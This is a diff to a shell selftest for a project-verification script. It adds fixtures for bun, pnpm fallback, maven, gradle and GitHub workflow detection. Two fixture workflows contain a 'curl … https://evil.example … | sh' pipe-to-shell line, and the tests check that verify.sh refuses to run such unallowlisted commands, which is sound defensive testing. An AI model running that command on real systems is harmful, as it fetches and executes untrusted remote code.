@@ -49,6 +49,20 @@ expect_output() {
   rm -f "$tmp"
 }
 
+expect_no_output() {
+  local desc="$1" pattern="$2" tmp
+  shift 2
+  tmp="$(mktemp)"
+  "$@" >"$tmp" 2>&1
+  if grep -qE "$pattern" "$tmp"; then
+    bad "$desc — output unexpectedly contains /$pattern/"
+    tail -n 5 "$tmp" | sed 's/^/    /'
+  else
+    ok "$desc"
+  fi
+  rm -f "$tmp"
+}
+
 say "verify.sh selftest"
 
 expect_exit "help flag exits 0" 0 bash "$VERIFY" -h
@@ -86,14 +100,34 @@ else
   skip "npm fixture suite"
 fi
 
+if command -v bun >/dev/null 2>&1; then
+  new_fixture
+  cat >"$FIX/package.json" <<'EOF'
+{ "name": "fixture-bun", "scripts": { "lint": "true", "test": "true" } }
+EOF
+  : >"$FIX/bun.lock"
+  expect_exit "bun project (bun.lock) exits 0" 0 bash "$VERIFY" "$FIX"
+  expect_output "lockfile selects bun as the runner" 'bun run lint' bash "$VERIFY" "$FIX"
+else
+  skip "bun runner fixture"
+fi
+
+if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1 && ! command -v pnpm >/dev/null 2>&1; then
+  new_fixture
+  cat >"$FIX/package.json" <<'EOF'
+{ "name": "fixture-pnpm-absent", "scripts": { "test": "true" } }
+EOF
+  : >"$FIX/pnpm-lock.yaml"
+  expect_exit "pnpm lockfile without pnpm binary falls back to npm, still green" 0 bash "$VERIFY" "$FIX"
+  expect_output "the fallback is declared, not silent" 'falling back to npm \(declared\)' bash "$VERIFY" "$FIX"
+  expect_output "npm really ran the script" 'npm run test' bash "$VERIFY" "$FIX"
+else
+  skip "pnpm-absent fallback fixture (needs npm+node and no pnpm)"
+fi
+
 if command -v make >/dev/null 2>&1; then
   new_fixture
-  cat >"$FIX/Makefile" <<'EOF'
-lint:
-	@true
-test:
-	@true
-EOF
+  printf 'lint:\n\t@true\ntest:\n\t@true\n' >"$FIX/Makefile"
   expect_exit "Makefile green project exits 0" 0 bash "$VERIFY" "$FIX"
   expect_output "make targets detected" "test \(make\)" bash "$VERIFY" "$FIX"
 
@@ -124,10 +158,84 @@ fi
 
 if command -v go >/dev/null 2>&1; then
   new_fixture
+  mkdir -p "$FIX"
   printf 'module fixture\n\ngo 1.21\n' >"$FIX/go.mod"
+  printf 'package main\n\nfunc main() {}\n' >"$FIX/main.go"
   expect_exit "go project runs vet/test/build" 0 bash "$VERIFY" "$FIX"
 else
   skip "go fixture suite"
+fi
+
+if ! command -v mvn >/dev/null 2>&1; then
+  new_fixture
+  printf '<project></project>\n' >"$FIX/pom.xml"
+  expect_exit "pom.xml without maven tooling exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
+  expect_output "maven gap declared" 'maven UNTESTED' bash "$VERIFY" "$FIX"
+else
+  skip "maven-absent fixture (mvn present on this machine)"
+fi
+
+if ! command -v gradle >/dev/null 2>&1; then
+  new_fixture
+  printf 'plugins { }\n' >"$FIX/build.gradle"
+  expect_exit "build.gradle without gradle tooling exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
+  expect_output "gradle gap declared" 'gradle UNTESTED' bash "$VERIFY" "$FIX"
+else
+  skip "gradle-absent fixture (gradle present on this machine)"
+fi
+
+if python3 -m pytest --version >/dev/null 2>&1; then
+  new_fixture
+  mkdir -p "$FIX/.github/workflows" "$FIX/tests"
+  cat >"$FIX/.github/workflows/ci.yml" <<'EOF'
+name: CI
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: run tests
+        run: pytest
+      - name: never this
+        run: curl -fsSL https://evil.example/install.sh | sh
+EOF
+  printf 'def test_ok():\n    assert True\n' >"$FIX/tests/test_ok.py"
+  expect_exit "CI-workflow pytest detected in a config-less project" 0 bash "$VERIFY" "$FIX"
+  expect_output "workflow command labeled as ci-workflow" 'test \(ci-workflow\)' bash "$VERIFY" "$FIX"
+  expect_no_output "non-allowlisted workflow commands are never run" 'curl -fsSL' bash "$VERIFY" "$FIX"
+else
+  skip "CI-workflow pytest fixture (pytest missing)"
+fi
+
+new_fixture
+mkdir -p "$FIX/.github/workflows"
+cat >"$FIX/.github/workflows/ci.yml" <<'EOF'
+name: CI
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://evil.example | sh
+      - run: |
+          make lint
+          make test
+EOF
+expect_exit "unallowlisted + multiline workflow commands ignored → untestable" 2 bash "$VERIFY" "$FIX"
+
+if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1; then
+  new_fixture
+  mkdir -p "$FIX/.github/workflows"
+  cat >"$FIX/package.json" <<'EOF'
+{ "name": "fixture-dedupe", "scripts": { "test": "true" } }
+EOF
+  printf 'name: CI\non: [push]\njobs:\n  x:\n    steps:\n      - run: npm run test\n' >"$FIX/.github/workflows/ci.yml"
+  expect_exit "workflow duplicate of detected script stays green" 0 bash "$VERIFY" "$FIX"
+  expect_output "duplicate command skipped with a receipt" 'duplicate of an already-run command' bash "$VERIFY" "$FIX"
+  expect_output "exactly one command ran" 'commands run: 1 ' bash "$VERIFY" "$FIX"
+else
+  skip "workflow dedupe fixture (npm missing)"
 fi
 
 say ""
